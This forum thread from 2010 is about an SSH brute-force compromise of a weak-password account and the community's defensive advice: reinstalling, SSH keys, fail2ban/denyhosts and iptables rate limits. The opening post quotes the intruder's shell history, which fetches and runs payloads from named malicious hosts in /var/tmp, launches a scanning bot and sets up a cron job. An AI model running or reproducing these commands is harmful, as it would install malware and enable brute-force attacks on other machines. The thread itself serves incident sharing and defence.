---
title: "Machine exposed - info about the attack"
date: 2010-06-04
forum: Security
---

### Post by xivaj on 2010-06-04
Hi,

just want to share with the community, my machine was exposed and security was "breached" by brute force, a stupid password, via ssh. Lucky thing is that the user was not sudoer.

They tried a lot of names and passwords and finally entered.
I could paste the log, but is not of interest, I guess.

When they were able to log in, they downloaded some software and installed something in the users crontab.
I put the history of the user, so maybe it is useful for somebody to see the files and or scripts they use. The IP was from Tegucigalpa, Honduras, and later they accessed again from Barcelona, Spain:
```

    1  w                           
    2  cat /proc/cpuinfo           
    3  passwd                      
    4  w                           
    5  cat /proc/cpuinfo
    6  wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
    7  cd /var/tmp
    8  wget http://geox.at.ua/x.pdf
    9  tar zxvf x.pdf
   10  rm -rf x.pdf
   11  cd .x
   12  nano inst
   13  ./start ovicaa
   14  cd /var/tmp
   15  wget http://rohacker.ucoz.ru/newSCAN.tar
   16  tar zxvf newSCAN.tar
   17  cd newSCAN
   18  ./a 95.18
   19  ./a 95.0
   20  cat /proc/cpuinfo
   21  cd /var/tmp
   22  cd newSCAN
   23  ./start 202
   24  crontab -w
   25  crontab -e
   26  top
   27  exit
   28  crontab -e
   29  exit
   30  history

```The files they downloaded are still there. They are a bunch of scripts, maybe also for trying to access other machines. 
The first task does something I ignore. The second one starts somekind of bot that searches for new machines and tries to brute-force them, just like mine. There is a long list of usernames and passwords in one of the files.

Anyway, when I saw it, there was this process m.run  using up to 100% cpu. I don't know what the windows file is for, maybe for checking download speed.

I have checked the logs and cleared the users cron and home folder (destroyed the user and re-created).

It is more than obvious that I have to adjust security settings (and knowledge) in my system. I think I am now clean, I run rkhunter and was ok, but I don't know if there are othere places I should also look for more stuff.

Thanks

---

### Post by CharlesA on 2010-06-04
If your machine has been compromised, it is usually best to wipe the OS and reinstall. You can never be sure if you got everything.

Altho, since they didn't get root access, you should be ok.

---

### Post by rookcifer on 2010-06-04
The attacker likely didn't get root (as these ssh brute-force bots don't need it).  However, best practice is to wipe the drive and reinstall just to be sure.  Then create a strong ssh password.

---

### Post by CharlesA on 2010-06-05
> **rookcifer said:**
> The attacker likely didn't get root (as these ssh brute-force bots don't need it).  However, best practice is to wipe the drive and reinstall just to be sure.  Then create a strong ssh password.

Or use keys. :)

---

### Post by Jimtuv on 2010-06-05
If it was a non sudo user they cant get system wide access so only that user is compromised not the whole OS. they can only do what a normal user has permission to do. so at worst you will have to delete the users home directory

---

### Post by Jive Turkey on 2010-06-05
Wouldn't it also be possible for a non sudo user to "su" an admin user, possibly brute forcing locally?  With that accomplished it might make sense for an attacker to clean up only the evidence of the admin level compromise to lull the victim into thinking they were ok just cleaning up the initial breach and leaving other rootkits/whatever intact.

Never mind me, I am creative and paranoid all at once.  I believe a stronger password or using keys, in combination with denyhosts or failtoban would likely have thwarted the attack.

@OP, would you mind sharing the list of users if you still have it?

---

### Post by HermanAB on 2010-06-05
This kind of attack has been in the wild for many years.  The attackers look for servers that are on optical links allowing them to send large volumes of spam.

I am of the opinion that the Ubuntu developers are severely negligent in configuring PAM to allow ridiculously short and insecure passwords by default.  These forums are full of tales of woe by users who got compromised after enabling a service such as VNC, FTP or SSH while using an insecure password.

---

### Post by OpSecShellshock on 2010-06-05
This is interesting; thanks for posting the activity logs. While the attacking hosts were, at least according to the post, located in Honduras and Spain, it seems those may have just been bots. The geox[dot]at[dot]ua and the ucoz[dot]ru have the same IP address, and despite the TLD's they're using seem to be (for the moment) physically located in the United Kingdom. Won't do any good to block that IP address simply because it's almost certainly fast flux. It's possible that the domain URLs are hard-coded in the initial script, though, in which case you can drop them into a hosts file. This is probably going to be attempted again, and if the only thing that's ultimately been changed is the user's password, well, there's a good chance it'll succeed.

Here's a little info on it (the link's safe):
[http://www.robtex.com/dns/geox.at.ua.html#records](http://www.robtex.com/dns/geox.at.ua.html#records)

---

### Post by bodhi.zazen on 2010-06-05
> **Jimtuv said:**
> If it was a non sudo user they cant get system wide access so only that user is compromised not the whole OS. they can only do what a normal user has permission to do. so at worst you will have to delete the users home directory

That is not true at all and it depends on the skill of the intruder vs the skill of the sys admin.

A skilled intruder can easily hide processes and alter logs. Most people advise reinstalling the OS.

Since the OP has to ask, I would error on the side of caution and assume the intruder is more skilled. Sure, that may be a false assumption, but it is a much safer assumption.

+1 for reinstalling the OS.

In the future, if you use services such as ssh or VNC learn to secure them. For SSH this means use keys, disable passwords, and use either iptables/denyhosts/faiil2ban to stop brute force attacks (although with keys such attempts are futile).

---

### Post by jflaker on 2010-06-05
Reinstall the OS to be sure nothing is left behind from the attacker.....

Create a user OTHER than what you had and with a strong alpha-numeric password.

Ensure that no other ports to that machine are open.  If so, close it off.

---

### Post by jackthechemist on 2010-06-05
What do you mean by 'keys'?

---

### Post by jflaker on 2010-06-05
> **jflaker said:**
> Reinstall the OS to be sure nothing is left behind from the attacker.....

Create a user OTHER than what you had and with a strong alpha-numeric password.

Ensure that no other ports to that machine are open.  If so, close it off.

Reason for creating a user with a different name.  Just in case the hacker comes back, they don't have a known user ID.  It will make it harder for the machine to be compromised again.

---

### Post by CharlesA on 2010-06-05
> **jackthechemist said:**
> What do you mean by 'keys'?

Use a key-pair for logging in via SSH instead of passwords.

[http://sial.org/howto/openssh/publickey-auth/](http://sial.org/howto/openssh/publickey-auth/)

---

### Post by bodhi.zazen on 2010-06-05
> **jackthechemist said:**
> What do you mean by 'keys'?

[https://help.ubuntu.com/community/SSH/OpenSSH/Keys](https://help.ubuntu.com/community/SSH/OpenSSH/Keys)

---

### Post by CharlesA on 2010-06-05
> **bodhi.zazen said:**
> [https://help.ubuntu.com/community/SSH/OpenSSH/Keys](https://help.ubuntu.com/community/SSH/OpenSSH/Keys)

This link is better than mine. :)

---

### Post by xivaj on 2010-06-07
Hi,

thank you very much for your replies. Sorry that I have taken so long to say something, I forgot to subscribe to the thread!

I have deleted the user, which name was "susan". I have taken a look at some of the scripts the intruder used and there are large listings of usernames and passwords. It contains usernames like "susan", "susana", "susanne", "suzanne" etc. And lots of passwords I would have thought they were safe. I can paste it here later, if someone is interested.

I deleted the user including home folder and am now doing a full reinstall, just to be safe. There is some possibility that he/she may have left some stuff in other folders as well (var/tmp), etc. It is prety obvious the intruder knows more than I do, so let's play the safer bet.

I normally use keys and change ports. But I left it just open at 22 because I was going to be working for 2 days in a place were only port22 was to be available and without my normal computer (for the key - I know, next time I'll carry it in a usbdrive). And actually, they started to throw users/passwd at my machine just a few hours after I opened the ports.

Normally my user has a strong password, and as I said, I use keys. But I forgot I once created this user for a purpose I can't now remember, and it was left there.

I haven't taken a look at the other software yet, but it may be some spammer crap, probably.

Next thing to learn is to properly configure iptables to block an attack like this. It took them like four hours, throwing names and passwords until they found the user, all attacks coming from the same IP.

Thanks a lot for the feedback. I feel very silly, but I learned a lot.:confused:

Kind regards

PD: @HermanAB
What do you mean with "optical links"?
> 
 The attackers look for servers that are on optical links allowing them...


---

### Post by bodhi.zazen on 2010-06-07
For defense, take a look at denyhosts or fail2ban

then learn iptables when you have time. iptables is a few simple rules :

-A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH --rsource
-A INPUT -m recent --update --seconds 600 --hitcount 4 --rttl --name SSH --rsource -j DROP
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT

(Assuming your default policy is DROP or later in your rules you drop all traffic).

[http://bodhizazen.net/Tutorials/iptables/](http://bodhizazen.net/Tutorials/iptables/)

---

### Post by xivaj on 2010-06-07
Hi @bodhi.zazen

thanks a lot!

How does denyhosts work? Just by doing "apt-get install denyhosts"?

Thank you very much about IPtables and the tutorial. I'll try to study this thoroughly. Actually, I'll have my Network-Subject exam on september!

Thanks again, 
Cheers

---

### Post by bodhi.zazen on 2010-06-07
> **xivaj said:**
> Hi @bodhi.zazen

thanks a lot!

How does denyhosts work? Just by doing "apt-get install denyhosts"?

Thank you very much about IPtables and the tutorial. I'll try to study this thoroughly. Actually, I'll have my Network-Subject exam on september!

Thanks again, 
Cheers

denyhosts works out of the box and uses tcpwrappers (/etc/hosts.deny). To customize how it works, read the config file, it is well commented.

Personally I use iptables as it does not require any additional services or configuration and I do not care to track ip addresses as they can be changed or spoofed easily enough.

A 10 min lockout + keys is sufficient. 

Otherwise, watch the logs, if you find a persistent IP -> block it.

---

### Post by The Cog on 2010-06-07
> **xivaj said:**
> 
PD: @HermanAB
What do you mean with "optical links"?

I think he means users with fibre-optic (high speed) internet connections rather than your normal sedate ADSL or cable speeds.

---

### Post by CharlesA on 2010-06-07
> **bodhi.zazen said:**
> 
Personally I use iptables as it does not require any additional services or configuration and I do not care to track ip addresses as they can be changed or spoofed easily enough.

A 10 min lockout + keys is sufficient. 

How did you set up such a lockout?

---

### Post by bodhi.zazen on 2010-06-07
> **CharlesA said:**
> How did you set up such a lockout?

```
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name  SSH --rsource
sudo iptables -A INPUT -m recent --update --seconds 600 --hitcount 4 --rttl --name SSH  --rsource -j DROP
sudo iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
```If you use scp , increase the --hitcount to 8-12 .

See also [http://bodhizazen.net/Tutorials/iptables/](http://bodhizazen.net/Tutorials/iptables/)

---

### Post by CharlesA on 2010-06-07
Ah ok. Thanks. :)

---

### Post by bodhi.zazen on 2010-06-07
> **CharlesA said:**
> Ah ok. Thanks. :)

You are most welcome =)

---

### Post by CharlesA on 2010-06-07
Bit of a *headdesk* moment there.. since I didn't relate 600 seconds to being 10 minutes.

---

### Post by bodhi.zazen on 2010-06-07
> **CharlesA said:**
> Bit of a *headdesk* moment there.. since I didn't relate 600 seconds to being 10 minutes.

:lolflag:

---

### Post by xivaj on 2010-06-08
Thanks!:guitar:

---

